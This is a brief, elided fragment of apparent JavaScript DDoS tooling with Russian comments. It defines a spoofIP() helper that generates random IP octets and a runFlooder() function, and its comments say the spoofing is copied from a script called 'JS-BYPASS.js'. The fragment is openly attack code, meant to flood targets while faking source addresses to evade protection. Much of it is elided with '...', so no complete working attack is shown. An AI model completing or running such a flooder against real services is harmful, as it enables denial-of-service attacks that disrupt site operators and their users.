...
// Функция спуфинга IP как в JS-BYPASS.js
function spoofIP() {
    const randDigit = (charset) => charset[Math.floor(Math.random() * charset.length)];
    const randOctet = () => {
        const first = randDigit("12");
        const second = randDigit("012345");
        const third = randDigit("012345");
...
function runFlooder() {
    ...
    // Добавляем спуфинг IP как в JS-BYPASS.js
